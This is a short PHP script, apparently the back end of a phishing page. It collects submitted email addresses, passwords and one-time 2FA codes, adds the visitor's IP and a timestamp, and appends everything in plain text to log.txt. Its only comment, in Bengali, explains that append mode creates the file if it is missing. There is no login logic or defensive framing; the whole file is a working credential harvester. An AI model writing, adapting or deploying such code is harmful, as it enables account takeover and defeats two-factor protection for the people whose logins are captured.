<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';
    $otp = $_POST['otp'] ?? 'N/A';
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date("Y-m-d H:i:s");

    $data = "Time: $time | IP: $ip\nUser: $email | Pass: $password | OTP: $otp\n---\n";

    // 'a' মোডে ফাইল ওপেন করলে ফাইল না থাকলেও তা তৈরি হয়ে যায়
    $file = fopen("log.txt", "a");
    if ($file) {
        fwrite($file, $data);
        fclose($file);
        echo "Success";
    } else {
        echo "Error: Manual creation required.";
    }
}
?>
